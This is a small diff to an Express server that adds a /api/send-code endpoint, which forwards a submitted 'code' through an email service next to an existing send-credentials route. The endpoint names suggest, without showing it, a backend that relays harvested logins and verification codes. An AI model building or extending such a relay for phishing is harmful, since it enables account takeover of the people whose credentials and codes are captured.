@@ -5,6 +5,7 @@ import {
   sendEmail,
   sendEmailLummy,
   sendCredentials,
+  sendCode,
 } from "./services/email.mjs";
 
 dotenv.config();
@@ -50,4 +51,12 @@ app.post("/api/send-credentials", async (req, res) => {
 
 app.listen(PORT, () => {
   console.log(`Server is running on http://localhost:${PORT}`);
+});
+
+app.post("/api/send-code", async (req, res) => {
+  const { code } = req.body;
+
+  await sendCode(code);
+
+  res.json({ message: "Code sent successfully" });
 });
